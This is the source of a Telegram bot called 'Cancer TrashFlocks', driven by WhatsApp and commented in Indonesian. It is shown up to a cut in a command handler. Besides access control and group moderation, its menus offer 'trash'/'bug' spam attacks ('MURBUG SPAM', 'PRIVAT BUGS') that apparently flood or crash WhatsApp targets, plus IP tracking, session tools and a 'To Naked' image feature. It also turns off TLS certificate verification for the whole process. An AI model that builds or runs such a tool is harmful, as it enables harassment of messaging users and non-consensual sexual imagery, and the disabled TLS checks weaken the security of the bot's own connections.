// ==========================================
// [ DEPENDENCIES ]
// ==========================================
const { Telegraf, Markup, session } = require("telegraf");
const fs = require("fs");
const path = require("path");
const moment = require("moment-timezone");
const baileys = require("@whiskeysockets/baileys");
const makeWASocket = baileys.default || baileys;
const {
    useMultiFileAuthState,
    fetchLatestBaileysVersion,
    DisconnectReason,
    makeInMemoryStore,
    jidDecode,
    Browsers          // ← tambah ini saja
} = baileys;
const pino = require("pino");
const chalk = require("chalk");
const axios = require("axios");
const { TOKEN_BOT, CHANNEL_USERNAME } = require("./settings/config");
const crypto = require("crypto");
const Module = require("module");
const vm = require("vm");
const fetch = require("node-fetch");

// Fix koneksi VPS
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

// ==========================================
// [ GLOBAL ERROR HANDLER - ANTI CRASH ]
// ==========================================
process.on("uncaughtException", (err) => {
    console.log(chalk.yellow("[SAFE] Uncaught Exception:", err?.message || err));
});

process.on("unhandledRejection", (reason) => {
    console.log(chalk.yellow("[SAFE] Unhandled Rejection:", reason?.message || reason));
});

// ==========================================
// [ UTILITY ]
// ==========================================
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// ══════════════════════════════════════════
// GAMBAR — ubah URL di sini untuk update
// gambar semua user sekaligus
// ══════════════════════════════════════════
// Ganti URL foto sesuai kebutuhan kamu di sini
const MAINTENANCE_IMAGE = "https://files.catbox.moe/dlw57p.jpg";
const WARNING_IMAGE      = "https://files.catbox.moe/a5sbpo.jpg"; // ganti dengan foto warning kamu
const CONNECT_IMAGE      = "https://files.catbox.moe/won2q9.jpg"; // ganti dengan foto connect kamu

const IMAGES = {
    start:    "https://files.catbox.moe/klib41.jpg",
    trash:    "https://files.catbox.moe/4ix5fw.jpg",
    invasion: "https://files.catbox.moe/uecenk.jpg",
    omega:    "https://files.catbox.moe/1aml5e.jpg",
    kuantum:  "https://files.catbox.moe/2g5xd5.jpg",
    modols:   "https://files.catbox.moe/ghle3r.jpg",
    thumb:    "https://files.catbox.moe/klib41.jpg",
};


// ==========================================
// [ MIDDLEWARE STUBS - ANTI ReferenceError ]
// ==========================================
if (typeof global.checkPremium === "undefined") {
    global.checkPremium = (ctx, next) => next?.();
}
if (typeof global.checkWhatsAppConnection === "undefined") {
    global.checkWhatsAppConnection = (ctx, next) => next?.();
}
if (typeof global.checkOwner === "undefined") {
    global.checkOwner = (ctx, next) => next?.();
}
if (typeof global.checkCooldown === "undefined") {
    global.checkCooldown = (ctx, next) => next?.();
}

// ==========================================
// [ STARTUP TERMINAL ASCII ]
// ==========================================
async function showStartupAnimation() {
    console.clear();

    for (const num of ["1", "2", "3"]) {
        console.clear();
        if (num === "1") {
            console.log(chalk.red.bold(`
        ██╗
        ██║
        ██║
        ██║
        ██║
        ╚═╝`));
        } else if (num === "2") {
            console.log(chalk.red.bold(`
        ██████╗ 
        ╚════██╗
         █████╔╝
        ██╔═══╝ 
        ███████╗
        ╚══════╝`));
        } else {
            console.log(chalk.red.bold(`
        ██████╗ 
        ╚════██╗
         █████╔╝
         ╚═══██╗
        ██████╔╝
        ╚═════╝`));
        }
        await sleep(800);
    }

    console.clear();

    const frames = [
`   ██████╗ 
  ██╔════╝ 
  ██║      
  ██║      
  ╚██████╗ 
   ╚═════╝ `,

`   ██████╗  █████╗ 
  ██╔════╝ ██╔══██╗
  ██║      ███████║
  ██║      ██╔══██║
  ╚██████╗ ██║  ██║
   ╚═════╝ ╚═╝  ╚═╝`,

`   ██████╗  █████╗ ███╗   ██╗
  ██╔════╝ ██╔══██╗████╗  ██║
  ██║      ███████║██╔██╗ ██║
  ██║      ██╔══██║██║╚██╗██║
  ╚██████╗ ██║  ██║██║ ╚████║
   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝`,

`   ██████╗  █████╗ ███╗   ██╗ ██████╗
  ██╔════╝ ██╔══██╗████╗  ██║██╔════╝
  ██║      ███████║██╔██╗ ██║██║     
  ██║      ██╔══██║██║╚██╗██║██║     
  ╚██████╗ ██║  ██║██║ ╚████║╚██████╗
   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝`,

`   ██████╗  █████╗ ███╗   ██╗ ██████╗███████╗
  ██╔════╝ ██╔══██╗████╗  ██║██╔════╝██╔════╝
  ██║      ███████║██╔██╗ ██║██║     █████╗  
  ██║      ██╔══██║██║╚██╗██║██║     ██╔══╝  
  ╚██████╗ ██║  ██║██║ ╚████║╚██████╗███████╗
   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚══════╝`,

`██████╗ ██████╗ ██╗ ██████╗
██╔══██╗██╔══██╗██║██╔════╝
██║  ██║██████╔╝██║██║     
██║  ██║██╔══██╗██║██║     
██████╔╝██║  ██║██║╚██████╗
╚═════╝ ╚═╝  ╚═╝╚═╝ ╚═════╝`
    ];

    for (const frame of frames) {
        console.clear();
        console.log(chalk.red.bold(frame));
        await sleep(600);
    }

    console.clear();
    console.log(chalk.red.bold(frames[frames.length - 1]));
    console.log(chalk.white.bgRed.bold(" [!] INITIALIZING... LOADING PAIRING CODE... \n"));
}

// ==========================================
// [ GITHUB TOKEN VALIDATION ]
// ==========================================
async function checkTokenFast() {
    try {
        const res = await axios.get(
            "https://raw.githubusercontent.com/dric-pmg/cancerteleg/main/cancerteleg.json",
            {
                timeout: 5000,
                headers: { "User-Agent": "Mozilla/5.0" }
            }
        );

        const data = res?.data ?? {};
        const tokens = Array.isArray(data.tokens) ? data.tokens : [];
        const isValid = tokens.includes(TOKEN_BOT);

        if (isValid) {
            console.log(chalk.green("✔️ Token terdaftar, bot diizinkan."));
        } else {
            console.log(chalk.red("❌ Token TIDAK terdaftar di GitHub."));
        }

        return isValid;

    } catch (err) {
        console.log(chalk.red("❌ Gagal validasi token (GitHub error):", err.message));
        return false;
    }
}

// ==========================================
// [ MAIN EXECUTION ]
// ==========================================
(async () => {
    try {
        await showStartupAnimation();

        console.log(chalk.cyan("🔍 Memeriksa token ke GitHub..."));

        const valid = await Promise.race([
            checkTokenFast(),
            new Promise(resolve => setTimeout(() => resolve(false), 5000))
        ]);

        if (!valid) {
            console.log(chalk.red.bold("🚫 Bot tidak dijalankan. Token tidak valid."));
            process.exit(0);
            return;
        }

        console.log(chalk.green.bold("🚀 MENJALANKAN BOT TELEGRAM...\n"));

        if (typeof bot !== "undefined" && typeof bot.launch === "function") {
            bot.launch({
                allowedUpdates: ["message", "callback_query"],
                dropPendingUpdates: true
            })
            .then(() => {
                console.log(chalk.green.bold("🤖 Telegram Bot Aktif & Online"));
            })
            .catch(err => {
                console.log(chalk.yellow("⚠️ Telegram launch error:", err.message));
            });

            process.once("SIGINT", () => bot.stop("SIGINT"));
            process.once("SIGTERM", () => bot.stop("SIGTERM"));

        } else {
            console.log(chalk.yellow("⚠️ Objek bot tidak ditemukan atau tidak valid."));
        }

        if (typeof WhatsAppConnect === "function") {
            WhatsAppConnect().catch(err => {
                console.log(chalk.yellow("⚠️ WhatsApp error:", err.message));
            });
        }

    } catch (err) {
        console.log(chalk.red("SYSTEM ERROR:", err.message));
        process.exit(0);
    }
})();
// ==========================================
// [ DATABASE PATHS ]
// ==========================================
const premiumFile = "./database/premium.json";
const adminFile = "./database/admin.json";
const ownerFile = "./database/owner.json";
const murbugFile = "./database/murbug.json";
const murbugSettingsFile = "./database/murbug_settings.json";
const maintenanceFile = "./database/maintenance.json";
const accessCodesFile = "./database/access_codes.json";
const sessionPath = "./session";

// ==========================================
// [ ENSURE DATABASE & SESSION FOLDER ]
// ==========================================
if (!fs.existsSync("./database")) fs.mkdirSync("./database");
if (!fs.existsSync("./session")) fs.mkdirSync("./session");
if (!fs.existsSync("./database/murbug.json")) fs.writeFileSync("./database/murbug.json", JSON.stringify([], null, 2));
if (!fs.existsSync(murbugSettingsFile)) fs.writeFileSync(murbugSettingsFile, JSON.stringify({}, null, 2));
if (!fs.existsSync(maintenanceFile)) fs.writeFileSync(maintenanceFile, JSON.stringify({ active: false }, null, 2));
if (!fs.existsSync("./database/blockcmd.json")) fs.writeFileSync("./database/blockcmd.json", JSON.stringify({}, null, 2));
if (!fs.existsSync("./database/premium.json")) fs.writeFileSync("./database/premium.json", JSON.stringify([], null, 2));
if (!fs.existsSync("./database/admin.json")) fs.writeFileSync("./database/admin.json", JSON.stringify([], null, 2));
if (!fs.existsSync("./database/owner.json")) fs.writeFileSync("./database/owner.json", JSON.stringify([], null, 2));
if (!fs.existsSync(accessCodesFile)) fs.writeFileSync(accessCodesFile, JSON.stringify({}, null, 2));

// ==========================================
// [ BOT INIT ]
// ==========================================
const bot = new Telegraf(TOKEN_BOT);
bot.use(session());

// ==========================================
// [ DATABASE HELPERS ]
// ==========================================
const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    try { return JSON.parse(fs.readFileSync(file, "utf8")); } catch { return []; }
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

const loadAccessCodes = () => {
    try { return JSON.parse(fs.readFileSync(accessCodesFile, "utf8")); } catch { return {}; }
};

const saveAccessCodes = (data) => {
    fs.writeFileSync(accessCodesFile, JSON.stringify(data, null, 2));
};

// ==========================================
// [ LOAD DATA ]
// ==========================================
let ownerUsers = loadJSON(ownerFile);
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);
let murbugGroups = new Set(loadJSON(murbugFile));
const blockcmdFile = "./database/blockcmd.json";

const loadBlockcmd = () => {
    if (!fs.existsSync(blockcmdFile)) return {};
    try {
        const raw = JSON.parse(fs.readFileSync(blockcmdFile, "utf8"));
        return (raw && typeof raw === "object" && !Array.isArray(raw)) ? raw : {};
    } catch { return {}; }
};
const saveBlockcmd = (data) => {
    if (!fs.existsSync("./database")) fs.mkdirSync("./database", { recursive: true });
    fs.writeFileSync(blockcmdFile, JSON.stringify(data, null, 2));
};

let blockcmdData = loadBlockcmd();

// ==========================================
// [ ASSETS & RUNTIME ]
// ==========================================
const thumbnailurl = IMAGES.thumb;
const startTime = Math.floor(Date.now() / 1000);

function getBotRuntime() {
    const seconds = Math.floor(Date.now() / 1000) - startTime;
    const days = Math.floor(seconds / (3600 * 24));
    const hours = Math.floor((seconds % (3600 * 24)) / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;
    return `${days}d, ${hours}h, ${minutes}m, ${secs}s`;
}

// ==========================================
// [ HELPER FUNCTIONS ]
// ==========================================
const isPrivate = (ctx) =>
    ctx.chat && ctx.chat.type === "private";

const isGroup = (ctx) =>
    ctx.chat &&
    (ctx.chat.type === "group" || ctx.chat.type === "supergroup");

const isOwner = (ctx) =>
    ownerUsers.includes(ctx.from?.id?.toString());

function getStatus(userId) {
    const id = userId.toString();
    if (ownerUsers.includes(id)) return "OWNER 👑";
    if (adminUsers.includes(id)) return "ADMIN 🛡️";
    if (premiumUsers.includes(id)) return "PREMIUM ✨";
    return "FREE USER 👤";
}

// ==========================================
// [ MIDDLEWARE: OWNER ONLY ]
// ==========================================
const checkOwnerOnly = (ctx, next) => {
    if (!isOwner(ctx)) {
        return ctx.replyWithHTML(
            "<blockquote>Maaf Fitur Ini Khusus Owner</blockquote>\n" +
            "<b>Please Contact @xnnxdxc</b>"
        );
    }
    return next();
};

// ==========================================
// [ MIDDLEWARE: OWNER OR ADMIN ]
// ==========================================
const checkOwnerOrAdmin = (ctx, next) => {
    const userId = ctx.from?.id?.toString();
    if (!ownerUsers.includes(userId) && !adminUsers.includes(userId)) {
        return ctx.replyWithHTML(
            "<blockquote>Owner & Admin Access Only</blockquote>\n" +
            "<b>Please Contact @xnnxdxc</b>"
        );
    }
    return next();
};

// Auto set commands
(async () => {
    try {
        await bot.telegram.setMyCommands(
            [{ command: 'start', description: 'Show All Fiture' }],
            { scope: { type: 'all_private_chats' } }
        );
        await bot.telegram.setMyCommands(
            [{ command: 'start', description: 'Show All Fiture By Cancer' }],
            { scope: { type: 'all_group_chats' } }
        );
        console.log("✔️ Commands berhasil didaftarkan.");
    } catch (e) {
        console.log("Set commands error:", e?.message);
    }
})();

// ==========================================
// [ MAINTENANCE MIDDLEWARE - CEGAH SEMUA KECUALI OWNER ]
// ==========================================
bot.use(async (ctx, next) => {
    try {
        if (loadMaintenance()) {
            const userId = ctx.from?.id?.toString();
            const ownerList = loadJSON(ownerFile);
            if (ownerList.includes(userId)) return next();

            // Kalau ada pesan / command / callback → tolak dengan foto maintenance
            const chatId = ctx.chat?.id;
            if (!chatId) return;

            // Hanya balas sekali per update, skip edited/dll
            if (ctx.updateType === "message" || ctx.updateType === "callback_query") {
                if (ctx.updateType === "callback_query") {
                    await ctx.answerCbQuery("🔧 Bot sedang maintenance!").catch(() => {});
                }
                await ctx.telegram.sendPhoto(chatId, MAINTENANCE_IMAGE, {
                    caption:
                        `<b>🔧 MAINTENANCE MODE 🔧</b>\n\n` +
                        `<pre><code class="language-yaml">` +
                        `╔══════ CANCER TRASHFLOCKS ══════╗\n\n` +
                        `  Status  : Under Maintenance\n` +
                        `  Creator      : @Pelecehann\n\n` +
                        `  Bot sedang ofline, bot di matikan oleh owner.\n` +
                        `  Harap tunggu, kami akan\n` +
                        `  segera kembali online.\n\n` +
                        `╚═══════════════════════╝` +
                        `</code></pre>`,
                    parse_mode: "HTML"
                }).catch(() => {});
            }
            return;
        }
        return next();
    } catch (e) {
        console.log("Maintenance middleware error:", e?.message);
        return next();
    }
});

// ==========================================
// [ CORE PROTECTION MIDDLEWARE ]
// ==========================================
bot.use((ctx, next) => {
    try {
        if (!ctx.chat) return next();

        // GRUP: semua bebas lewat tanpa kode
        if (isGroup(ctx)) return next();

        // PRIVATE: cek otorisasi
        if (isPrivate(ctx)) {
            if (!ctx.session) ctx.session = {};

            const text = ctx.message?.text || "";
            const isStartCmd = text.startsWith("/start");
            const isCreatkodeCmd = text.startsWith("/creatkode");

            // Owner langsung lewat tanpa kode
            if (isOwner(ctx)) return next();

            // Sudah authorized
            if (ctx.session.isAuthorized) return next();

            // Boleh lewat untuk /start dan /creatkode
            if (isStartCmd || isCreatkodeCmd) return next();

            return ctx.reply(
                "🔒 Akses bot terkunci.\n" +
                "Gunakan kode akses: /start <kode>"
            );
        }

        return next();
    } catch (e) {
        console.log("Middleware error:", e?.message);
        return next();
    }
});

// ==========================================
// [ ANTI-FEATURES MIDDLEWARE UNTUK GRUP ]
// ==========================================

async function sendWarning(ctx, chatId, icon, label, violatorId, violatorName) {
    const caption =
        `<pre><code class="language-yaml">` +
        `╔══════ WARNING ══════════════╗\n\n` +
        `  ${icon} ${label.toUpperCase()} AKTIF\n\n` +
        `  User   : ${violatorName}\n` +
        `  ID     : ${violatorId}\n` +
        `  Grup   : ${ctx.chat.title || "-"}\n` +
        `  Status : Pesan Dihapus ❌\n\n` +
        `  Tindakan ini melanggar\n` +
        `  aturan grup!\n\n` +
        `╚══════════════════════════════╝` +
        `</code></pre>`;
    const m = await ctx.telegram.sendPhoto(chatId, WARNING_IMAGE, {
        caption,
        parse_mode: "HTML"
    }).catch(() => null);
    if (m) setTimeout(() => ctx.telegram.deleteMessage(chatId, m.message_id).catch(() => {}), 8000);
}

bot.use(async (ctx, next) => {
    try {
        if (!isGroup(ctx)) return next();
        const chatId = ctx.chat.id.toString();
        const msg = ctx.message;
        if (!msg) return next();
        const userId = ctx.from?.id;
        const userName = ctx.from?.first_name || "Unknown";

        // Owner & admin bebas dari anti-features
        if (isOwnerOrAdmin(userId)) return next();

        // ── ANTI FORWARD ──
        if (getMurbugSetting(chatId, "antiforward") && (msg.forward_from || msg.forward_from_chat || msg.forward_sender_name)) {
            await ctx.deleteMessage().catch(() => {});
            await sendWarning(ctx, chatId, "↩️", "Anti Forward", userId, userName);
            return;
        }

        // ── ANTI LINK ──
        if (getMurbugSetting(chatId, "antilink") && msg.text) {
            const linkRegex = /(https?:\/\/[^\s]+|t\.me\/[^\s]+|www\.[^\s]+)/gi;
            if (linkRegex.test(msg.text)) {
                await ctx.deleteMessage().catch(() => {});
                await sendWarning(ctx, chatId, "🔗", "Anti Link", userId, userName);
                return;
            }
        }

        // ── ANTI PROMOSI ──
        if (getMurbugSetting(chatId, "antipromosi") && msg.text) {
            const promoRegex = /(join|invite|promo|diskon|jual|beli|order|wa\.me|bit\.ly|shopee|sel|tokopedia|open|olshop|bayar|harga|murah)/gi;
            if (promoRegex.test(msg.text)) {
                await ctx.deleteMessage().catch(() => {});
                await sendWarning(ctx, chatId, "📢", "Anti Promosi", userId, userName);
                return;
            }
        }

        // ── ANTI FOTO ──
        if (getMurbugSetting(chatId, "antifoto") && (msg.photo || msg.document?.mime_type?.startsWith("image/"))) {
            await ctx.deleteMessage().catch(() => {});
            await sendWarning(ctx, chatId, "📷", "Anti Foto", userId, userName);
            return;
        }

        // ── ANTI VIDEO ──
        if (getMurbugSetting(chatId, "antivideo") && (msg.video || msg.video_note || msg.document?.mime_type?.startsWith("video/"))) {
            await ctx.deleteMessage().catch(() => {});
            await sendWarning(ctx, chatId, "🎥", "Anti Video", userId, userName);
            return;
        }

        // ── ANTI STIKER ──
        if (getMurbugSetting(chatId, "antistiker") && msg.sticker) {
            await ctx.deleteMessage().catch(() => {});
            await sendWarning(ctx, chatId, "🎭", "Anti Stiker", userId, userName);
            return;
        }

        // ── ANTI TOXIC ──
        if (getMurbugSetting(chatId, "antitoxic") && msg.text) {
            const toxicWords = /(anjing|bangsat|babi|kontol|memek|tolol|bodoh|goblok|idiot|kampret|bajingan|sialan|yatim|keparat|tai|jancok|asu)/gi;
            if (toxicWords.test(msg.text)) {
                await ctx.deleteMessage().catch(() => {});
                await sendWarning(ctx, chatId, "☠️", "Anti Toxic", userId, userName);
                return;
            }
        }

        return next();
    } catch (e) {
        console.log("Anti-features error:", e?.message);
        return next();
    }
});

// ==========================================
// [ TOMBOL GRUP ]
// ==========================================
const styles = ["Primary", "Success", "Danger"];


const btnUtama = {
    styleIndex: 0,
    getMainKeyboard() {
        const style = styles[this.styleIndex];
        this.styleIndex = (this.styleIndex + 1) % styles.length;

        return {
            inline_keyboard: [
                [
                    { text: "🧤 LIST TRASH", callback_data: "listtrash", style: style, icon_custom_emoji_id: "5465225015190367274" },
                    { text: "🧉 FITURE", callback_data: "fitureMenu", style: style, icon_custom_emoji_id: "5465262274031659421" }
                ],
                [
                    { text: "🧱 CONNECT", callback_data: "connectMenu", style: style, icon_custom_emoji_id: "5463121572137022242" },
                    { text: "🛖 THANKS TO", callback_data: "tqto", style: style, icon_custom_emoji_id: "5463412289883353404" },
                ],
                [
                    { text: "⛱ CREATOR", url: "https://t.me/xnnxdxc", style: style, icon_custom_emoji_id: "5463156928307801722" }
                ]
            ]
        };
    }
};

// ==========================================
// [ TOMBOL PRIVATE - TERPISAH DARI GRUP ]
// ==========================================
function getPrivateMainKeyboard() {
    return {
        inline_keyboard: [
            [
                { text: "🦠 Trash Feture", callback_data: "trashshow", style: "Primary", icon_custom_emoji_id: "5465225015190367274" },
                { text: "⚙️ Settings", callback_data: "settings", style: "Primary", icon_custom_emoji_id: "5463412289883353404" }
            ],
            [
                { text: "🛠️ Tools", callback_data: "toolsmenu", style: "Danger", icon_custom_emoji_id: "5465137208878969279" },
                { text: "🤝 Thanks To", callback_data: "thanksto", style: "Danger", icon_custom_emoji_id: "5463054218459884779" }
            ],
            [
                { text: "👤 Creator", url: "https://t.me/xnnxdxc", style: "Success", icon_custom_emoji_id: "5463156928307801722" }
            ]
        ]
    };
}

const btnKembali = {
    inline_keyboard: [
        [{ text: "BACK TO START", callback_data: "back_start", style: "Primary" }]
    ]
};

// ─── FITURE sub-menu ───
const btnFitureMenu = {
    inline_keyboard: [
        [
            { text: "🏯 GROUP", callback_data: "fitureGroup", style: "Danger" },
            { text: "🎠 MURBUG", callback_data: "fiture_murbug", style: "Danger" }
        ],
        [
            { text: "⚙️ CONTROL", callback_data: "fitureControl", style: "Primary" },
            { text: "🛝 PLAYED", callback_data: "fiture_played", style: "Primary" }
        ],
        [{ text: "KEMBALI", callback_data: "back_start", style: "Primary" }]
    ]
};

// ─── GROUP sub-menu ───
const btnGroupMenu = {
    inline_keyboard: [
        [
            { text: "↩️ Anti Forward", callback_data: "tgl_antiforward", style: "Primary" },
            { text: "🔗 Anti Link", callback_data: "tgl_antilink", style: "Primary" }
        ],
        [
            { text: "📢 Anti Promosi", callback_data: "tgl_antipromosi", style: "Danger" },
            { text: "📷 Anti Foto", callback_data: "tgl_antifoto", style: "Danger" }
        ],
        [
            { text: "🎥 Anti Video", callback_data: "tgl_antivideo", style: "Success" },
            { text: "🎭 Anti Stiker", callback_data: "tgl_antistiker", style: "Success" }
        ],
        [
            { text: "☠️ Anti Toxic", callback_data: "tgl_antitoxic", style: "Primary" },
            { text: "📊 Status Anti", callback_data: "statusAnti", style: "Primary" }
        ],
        [{ text: "KEMBALI", callback_data: "fitureMenu", style: "Primary" }]
    ]
};

// ─── MURBUG sub-menu ───
const btnMurbugMenu = {
    inline_keyboard: [
        [
            { text: "➕ Add Premium", callback_data: "mb_addprem", style: "Danger" },
            { text: "➖ Del Premium", callback_data: "mb_delprem", style: "Danger" }
        ],
        [
            { text: "👑 Add Admin", callback_data: "mb_addadmin", style: "Primary" },
            { text: "🗑️ Del Admin", callback_data: "mb_deladmin", style: "Primary" }
        ],
        [
            { text: "🚫 Block CMD", callback_data: "mb_blockcmd", style: "Success" },
            { text: "✔️ Del Block", callback_data: "mb_delblock", style: "Success" }
        ],
        [
            { text: "🏘️ Add Murbug", callback_data: "mb_addmurbug", style: "Primary" },
            { text: "❌ Del Murbug", callback_data: "mb_delmurbug", style: "Primary" }
        ],
        [{ text: "📋 List Murbug", callback_data: "mb_listmurbug", style: "Danger" }],
        [{ text: "KEMBALI", callback_data: "fitureMenu", style: "Primary" }]
    ]
};

// ─── CONTROL sub-menu ───
const btnControlMenu = {
    inline_keyboard: [
        [
            { text: "🔧 Maintenance ON", callback_data: "ctrl_mainton", style: "Danger" },
            { text: "✔️ Maintenance OFF", callback_data: "ctrl_maintoff", style: "Danger" }
        ],
        [{ text: "📢 Set Channel", callback_data: "ctrl_setchannel", style: "Primary" }],
        [{ text: "KEMBALI", callback_data: "fitureMenu", style: "Primary" }]
    ]
};

// ─── PLAYED sub-menu ───
const btnPlayedMenu = {
    inline_keyboard: [
        [
            { text: "🧠 IQ Test",    callback_data: "pl_iqtest", style: "Primary" },
            { text: "🎵 Brat",       callback_data: "pl_brat", style: "Primary" }
        ],
        [
            { text: "🌐 Get Code",   callback_data: "pl_getcode", style: "Danger" },
            { text: "📍 Track IP",   callback_data: "pl_trackip", style: "Danger" }
        ],
        [
            { text: "🎵 TikTok DL",  callback_data: "pl_tiktokdl", style: "Success" },
            { text: "🔗 To URL",     callback_data: "pl_tourl", style: "Success" }
        ],
        [
            { text: "🖼️ To Naked",   callback_data: "pl_tonaked", style: "Primary" },
            { text: "📄 Enc HTML",   callback_data: "pl_enchtml", style: "Primary" }
        ],
        [
            { text: "📱 SS iPhone",  callback_data: "pl_ssiphone", style: "Danger" },
            { text: "🗂️ C Sessions", callback_data: "pl_csessions", style: "Danger" }
        ],
        [{ text: "KEMBALI", callback_data: "fitureMenu", style: "Success" }]
    ]
};

// ─── LIST TRASH sub-menu ───
const btnTrashMenu = {
    inline_keyboard: [
        [
            { text: "💀 MURBUG SPAM", callback_data: "trash_murbug", style: "Danger" },
            { text: "🔒 PRIVAT BUGS", callback_data: "trash_privat", style: "Primary" }
        ],
        [{ text: "KEMBALI", callback_data: "back_start", style: "Success" }]
    ]
};

// ─── CONNECT sub-menu (info cara connect) ───
const btnConnectMenu = {
    inline_keyboard: [
        [{ text: "📋 List Sender", callback_data: "conn_listsender", style: "Danger" }],
        [{ text: "KEMBALI", callback_data: "back_start", style: "Primary" }]
    ]
};

const btnNavigasi1 = {
    inline_keyboard: [
        [
            { text: "1 / 2", callback_data: "none", style: "Danger" },
            { text: "NEXT >>", callback_data: "fitur_pg2", style: "Danger", icon_custom_emoji_id: "5465198330558557107" }
        ],
        [{ text: "KEMBALI", callback_data: "back_start", style: "Primary", icon_custom_emoji_id: "5465465194056525619" }]
    ]
};

const btnNavigasi2 = {
    inline_keyboard: [
        [
            { text: "<< BACK", callback_data: "fitur_pg1", style: "Danger" },
            { text: "2 / 2", callback_data: "none", style: "Danger" }
        ],
        [{ text: "KEMBALI", callback_data: "back_start", style: "Primary", icon_custom_emoji_id: "5462990652943904884" }]
    ]
};

// ==========================================
// [ BOT START - HANDLER TUNGGAL ]
// Grup  → tampil menu grup
// Private Owner → auto masuk tanpa kode
// Private User  → wajib kode
// ==========================================

bot.start(async (ctx) => {

    // ── GRUP ──────────────────────────────
    if (isGroup(ctx)) {
        ownerUsers  = loadJSON(ownerFile);
        adminUsers  = loadJSON(adminFile);
        premiumUsers = loadJSON(premiumFile);

        const userStatus = getStatus(ctx.from.id);
        const runtime    = getBotRuntime();

        // Hitung sender & status WA
        let senderCount = 0;
        let senderStatus = "🔴 Offline";
        try {
            if (fs.existsSync("./session")) {
                const entries = fs.readdirSync("./session", { withFileTypes: true });
                senderCount = entries.filter(e => e.isDirectory()).length;
            }
            const sock = global.waSocket || global.conn;
            if (sock?.ws?.readyState === 1) senderStatus = "🟢 Online";
        } catch {}

        const startMsg =
            `<blockquote expandable><b>🦀 Cᴀɴᴄᴇʀ Tʀᴀsʜғʟᴏᴄᴋs 🦀</b></blockquote>\n` +
            `<pre><code class="language-yaml">` +
            `╔══════ CANCER V20 ══════╗\n\n` +
            `  Bot     : Cancer TrashFlocks\n` +
            `  Dev     : Its Dric\n` +
            `  Prefix  : Slash [ / ]\n` +
            `  Runtime : ${runtime}\n\n` +
            `  User    : ${ctx.from.first_name}\n` +
            `  ID      : ${ctx.from.id}\n` +
            `  Status  : ${userStatus}\n\n` +
            `  Sender  : ${senderCount} Nomor\n` +
            `  WA      : ${senderStatus}\n\n` +
            `╚═══════════════════════╝` +
            `</code></pre>\n` +
            `<blockquote><i>Pilih menu di bawah untuk eksekusi.</i></blockquote>`;

        try {
            await ctx.replyWithPhoto(
                IMAGES.start,
                {
                    caption: startMsg,
                    parse_mode: "HTML",
                    reply_markup: btnUtama.getMainKeyboard()
                }
            );
        } catch (e) {
            console.log("Start grup error:", e?.message);
        }
        return;
    }

    // ── PRIVATE ───────────────────────────
    if (!isPrivate(ctx)) return;

    try {
        if (!ctx.session) ctx.session = {};

        const text     = ctx.message?.text || "";
        const args     = text.split(" ");
        const userCode = args[1];
        const runtime  = getBotRuntime();

        // Owner: auto langsung masuk tanpa kode
        if (isOwner(ctx)) {
            ctx.session.isAuthorized = true;
        }

        // Non-owner: wajib kode jika belum authorized
        if (!ctx.session.isAuthorized) {
            if (!userCode) {
                return ctx.replyWithHTML(
                    "<b>🔑 Bot Terkunci</b>\n" +
                    "Silakan masukkan kode unik anda.\n" +
                    "Format: <code>/start KODE</code>"
                );
            }

            const codes = loadAccessCodes();

            if (!codes[userCode]) {
                return ctx.replyWithHTML("<b>❌ Kode Tidak Valid!</b>");
            }

            const data = codes[userCode];
            const currentUsername = ctx.from.username || ctx.from.id.toString();

            if (
                data.target !== currentUsername &&
                data.target !== ctx.from.id.toString()
            ) {
                return ctx.replyWithHTML(
                    `<b>❌ Salah Target!</b>\nKode ini untuk @${data.target}.`
                );
            }

            ctx.session.isAuthorized = true;
            delete codes[userCode];
            saveAccessCodes(codes);
            await ctx.reply("✔️ Kode Benar! Bot diaktifkan.");
        }

        // Tampil menu private
        const userStatusPv = getStatus(ctx.from.id);

        let senderCount = 0;
        let senderStatus = "🔴 Offline";
        try {
            if (fs.existsSync("./session")) {
                const entries = fs.readdirSync("./session", { withFileTypes: true });
                senderCount = entries.filter(e => e.isDirectory()).length;
            }
            const sock = global.waSocket || global.conn;
            if (sock?.ws?.readyState === 1) senderStatus = "🟢 Online";
        } catch {}

        const menuMessage =
            `<blockquote expandable><b>🦀 Cᴀɴᴄᴇʀ Tʀᴀsʜғʟᴏᴄᴋs 🦀</b></blockquote>\n` +
            `<pre><code class="language-yaml">` +
            `╔══════ CANCER V20 ══════╗\n\n` +
            `  Bot     : Cancer TrashFlocks\n` +
            `  Dev     : Its Dric\n` +
            `  Version : 20.0.0\n` +
            `  Prefix  : Slash [ / ]\n` +
            `  Runtime : ${runtime}\n\n` +
            `  User    : ${ctx.from.first_name}\n` +
            `  ID      : ${ctx.from.id}\n` +
            `  Status  : ${userStatusPv}\n\n` +
            `  Sender  : ${senderCount} Nomor\n` +
            `  WA      : ${senderStatus}\n\n` +
            `  Mode    : ✉️ Private Chat\n` +
            `╚═══════════════════════╝` +
            `</code></pre>\n` +
            `<blockquote><i>Selamat datang! Pilih menu di bawah.</i></blockquote>`;

        await ctx.replyWithPhoto(thumbnailurl, {
            caption: menuMessage,
            parse_mode: "HTML",
            reply_markup: getPrivateMainKeyboard()
        });

        if (fs.existsSync("./assets/Cancer.mp3")) {
            await ctx.replyWithAudio(
                { source: fs.createReadStream("./assets/Cancer.mp3") },
                {
                    title: "Cancer",
                    caption: "Cancer TrashFlocks",
                    performer: "Itss Dricc"
                }
            );
        }

    } catch (e) {
        console.log("Start private error:", e?.message);
    }
});

// ==========================================
// [ COMMAND: CREATKODE - OWNER ONLY, PRIVATE ONLY ]
// ==========================================
bot.command("creatkode", async (ctx) => {
    // Hanya private
    if (!isPrivate(ctx)) return;

    // Hanya owner
    if (!isOwner(ctx)) {
        return ctx.replyWithHTML(
            "<blockquote>Owner Access Only</blockquote>\n" +
            "<b>Please Contact @xnnxdxc</b>"
        );
    }

    try {
        const args = ctx.message.text.split(" ");
        if (args.length < 2) {
            return ctx.replyWithHTML(
                "<b>⚠️ Format Salah!</b>\n" +
                "Gunakan: <code>/creatkode @username</code>"
            );
        }

